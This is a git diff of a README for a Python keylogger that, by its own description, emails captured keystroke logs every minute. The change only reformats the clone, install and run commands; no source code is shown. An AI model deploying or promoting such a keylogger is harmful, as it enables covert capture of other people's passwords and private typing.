@@ -5,7 +5,7 @@
   * Then it's been alter to send the logs to your email every minute (you can      change this).
 
 # INSTALLATION
-  1. Clone it: git clone https://github.com/MasterMind-404/pyxhook_keylog.git
-  2. Requirements: pip install -r requiremets.txt
-  3. Run it: python pyxhook_keylog.py
-  4. Usage: Type some keystrokes then press Control(ctrl) + C for Keyboard interrupt.
+  1. Clone it: 'git clone https://github.com/MasterMind-404/pyxhook_keylog.git'
+  2. Requirements: 'pip install -r requiremets.txt'
+  3. Run it: 'python pyxhook_keylog.py'
+  4. Usage: Type some keystrokes then press Control(ctrl) + C for Keyboard          interrupt.
